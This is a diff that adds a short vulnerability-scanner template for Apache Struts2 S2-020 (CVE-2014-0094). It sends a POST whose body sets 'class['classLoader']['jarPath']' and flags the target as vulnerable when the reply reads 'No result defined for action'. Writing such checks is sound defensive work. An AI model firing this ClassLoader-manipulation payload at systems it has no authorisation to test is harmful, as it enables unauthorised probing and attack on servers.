@@ -1,0 +1,17 @@
+id: s2-020
+type: default
+info:
+  name: Struts2 s2-020 DoS attacks and ClassLoader manipulation
+  risk: High
+  cve: CVE-2014-0094
+
+variables:
+
+requests:
+  - method: POST
+    redirect: false
+    url: '{{.URL}}'
+    body: "class[%27classLoader%27][%27jarPath%27]=1024"
+    matchers:
+      - dsl:
+          - "status_code==200 && contains(body, 'No result defined for action')"
